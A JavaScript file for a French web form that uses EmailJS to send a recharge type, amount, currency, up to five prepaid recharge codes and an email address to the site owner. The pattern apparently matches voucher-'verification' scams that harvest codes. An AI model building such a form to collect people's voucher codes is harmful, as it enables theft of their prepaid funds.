function isEmailJSLoaded() {
  return typeof emailjs !== 'undefined';
}

// Check if EmailJS is loaded when DOM is ready
document.addEventListener('DOMContentLoaded', function() {
  if (!isEmailJSLoaded()) {
    console.error('EmailJS library not loaded');
    const errorDiv = document.querySelector('.error-message');
    if (errorDiv) {
      errorDiv.textContent = "Service de messagerie non disponible. Veuillez réessayer plus tard.";
      errorDiv.style.display = "block";
    }
  } else {
    console.log('EmailJS is loaded and ready');
  }
});


function sendMail() {
  const loadingDiv = document.querySelector('.loading');
  const errorDiv = document.querySelector('.error-message');
  const successDiv = document.querySelector('.sent-message');
  
  if (!isEmailJSLoaded()) {
    console.error('EmailJS not loaded when trying to send mail');
    errorDiv.textContent = "Service de messagerie non disponible. Veuillez réessayer plus tard.";
    errorDiv.style.display = "block";
    return;
  }
  
  try {
    console.log('Preparing to send email...');
    document.body.style.cursor = 'wait';
    loadingDiv.style.display = "block";
    
    var params = {
      crecharge: document.getElementById("rechargetype").value,
      montant: document.getElementById("montant").value,
      devise: document.getElementById("devise").value,
      recharge1: document.getElementById("recharge01").value,
      recharge2: document.getElementById("recharge02").value,
      recharge3: document.getElementById("recharge03").value,
      recharge4: document.getElementById("recharge04").value,
      recharge5: document.getElementById("recharge05").value,
      email: document.getElementById("email").value,
    };

    console.log('Email parameters:', params);

    var rechargesFilled = false;
    for (var i = 1; i <= 5; i++) {
      if (document.getElementById("recharge0" + i).value !== "") {
        rechargesFilled = true;
        break;
      }
    }




    // Add additional parameter validation
    if (!params.email || !params.crecharge || !params.montant || !params.devise || !rechargesFilled) {
      errorDiv.textContent = "Veuillez remplir tous les champs obligatoires.";
      errorDiv.style.display = "block";
      document.body.style.cursor = 'default';
      loadingDiv.style.display = "none";
      return;
    }

    errorDiv.style.display = "none";
    successDiv.style.display = "none";

    // Set a shorter timeout for the email sending (15 seconds instead of 30)
    const emailTimeout = setTimeout(() => {
      document.body.style.cursor = 'default';
      loadingDiv.style.display = "none";
      errorDiv.textContent = "Le délai d'attente est dépassé. Veuillez réessayer.";
      errorDiv.style.display = "block";
    }, 15000);

    // Check if running locally
    if (window.location.protocol === 'file:') {
      clearTimeout(emailTimeout);
      document.body.style.cursor = 'default';
      loadingDiv.style.display = "none";
      errorDiv.innerHTML = `
      Le service de messagerie ne fonctionne pas en mode local.<br>
      Pour tester cette fonctionnalité:<br>
      1. Déployez le site sur GitHub Pages ou Netlify<br>
      2. Ou exécutez un serveur local:<br>
         - Python: <code>python -m http.server 8000</code><br>
         - Node.js: <code>npx http-server</code><br>
      Puis accédez à http://localhost:8000
      `;
      errorDiv.style.display = "block";
      return;
    }

    // Update service ID and template ID
    const serviceID = "service_p6xjkwk";  // Keep existing service ID
    const templateID = "template_s1kqilp"; // Keep existing template ID

    // Add public key validation
    if (!emailjs.init) {
      throw new Error('EmailJS not initialized properly');
    }

    console.log('Sending email with service:', serviceID, 'template:', templateID);
    emailjs.send(serviceID, templateID, params)
      .then(res => {
      console.log('Email sent successfully:', res);
      clearTimeout(emailTimeout);
      document.body.style.cursor = 'default';
      ["rechargetype", "email", "montant", "devise", 
       "recharge01", "recharge02", "recharge03", "recharge04", "recharge05"]
        .forEach(id => document.getElementById(id).value = "");
      
      loadingDiv.style.display = "none";
      successDiv.style.display = "block";
      })
      .catch(err => {
      console.error('Detailed email send error:', err);
      clearTimeout(emailTimeout);
      document.body.style.cursor = 'default';
      loadingDiv.style.display = "none";
      errorDiv.textContent = err.text || "Une erreur s'est produite. Veuillez réessayer.";
      errorDiv.style.display = "block";
      });
    } catch (error) {
    console.error('Detailed error in sendMail:', error);
    document.body.style.cursor = 'default';
    loadingDiv.style.display = "none";
    errorDiv.textContent = "Une erreur inattendue s'est produite.";
    errorDiv.style.display = "block";
    }

}

// Export the function for use in HTML
window.sendMail = sendMail;